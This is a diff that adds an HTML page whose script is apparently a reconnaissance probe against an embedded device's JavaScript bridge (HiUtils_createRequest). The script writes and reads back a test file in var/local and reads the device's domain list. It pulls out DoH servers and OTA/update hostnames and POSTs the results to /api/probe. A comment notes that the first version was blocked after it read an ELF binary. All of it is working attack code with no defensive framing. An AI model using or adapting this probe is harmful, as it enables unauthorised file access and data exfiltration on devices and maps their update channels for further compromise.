@@ -1,0 +1,67 @@
+<!doctype html>
+<!-- Phase-3 probe v2: no binary reads (they killed the bridge in v1 after
+     the first ELF read - proc/version pass through was fine). This run gets
+     the /var/local write gate and the domain map only. -->
+<html><head><meta charset="utf-8"><title>phase3 probe 2</title></head>
+<body><pre id="out">phase3 probe 2…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), writetest: {}, domain: {} };
+  function save() {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/probe", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify(report));
+    } catch (e) {}
+  }
+  function line(t) { out.textContent = out.textContent + "\n" + t; }
+  function rd(path, cap) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var body = (typeof r.msg === "string") ? r.msg : JSON.stringify(r.msg);
+      return { path: path, ok: r && r.ret === true, body: (r && r.ret === true) ? String(body).slice(0, cap || 512) : null,
+               err: (r && r.ret !== true) ? body : null };
+    } catch (e) { return { path: path, ok: false, err: "EXC " + e }; }
+  }
+
+  // /var/local write gate
+  try {
+    var marker = "alv-phase3 " + new Date().toISOString() + "\n";
+    var w = HiUtils_createRequest("fileWrite", { path: "var/local/.alv-phase3-test", mode: 6, writedata: marker });
+    report.writetest.write = { ret: !!w.ret, code: w.code, msg: (typeof w.msg === "string" ? w.msg : JSON.stringify(w.msg)) };
+    var back = rd("var/local/.alv-phase3-test", 200);
+    report.writetest.readback = { ok: back.ok, body: back.body, err: back.err };
+    line("write /var/local: ret=" + report.writetest.write.ret + " readback=" + (back.ok ? "OK" : "FAIL " + String(back.err).slice(0, 80)));
+  } catch (e) { report.writetest.error = String(e); line("writetest error: " + e); }
+
+  // domain map
+  try {
+    var r0 = HiUtils_createRequest("fileRead", { path: "domain/domain_list.json", mode: 6 });
+    var body = (typeof r0.msg === "string") ? r0.msg : JSON.stringify(r0.msg);
+    report.domain.read = { ok: r0 && r0.ret === true, err: (typeof body === "string") ? null : body };
+    line("domain read ret=" + (r0 && r0.ret) + " len=" + (body ? body.length : 0));
+    if (report.domain.read.ok) {
+      var m = JSON.parse(body);
+      report.domain.dohServers = m.dohServers || null;
+      report.domain.keys = Object.keys(m);
+      var hosts = [];
+      function walk(o) {
+        if (typeof o === "string") { if (/(ota|upd|grade|dpp)/i.test(o)) hosts.push(o.slice(0, 140)); }
+        else if (Array.isArray(o)) o.forEach(walk);
+        else if (o && typeof o === "object") for (var k in o) {
+          if (/(ota|upd|grade|dpp)/i.test(k)) hosts.push("KEY " + k + "=" + JSON.stringify(o[k]).slice(0, 240));
+          walk(o[k]);
+        }
+      }
+      walk(m);
+      report.domain.ota_like = hosts.slice(0, 60);
+      line("ota_like hits: " + report.domain.ota_like.length);
+    }
+  } catch (e) { report.domain.error = String(e); line("domain error: " + e); }
+
+  save(); setTimeout(save, 400);
+  out.textContent += "\n[reported]";
+})();
+</script></body></html>
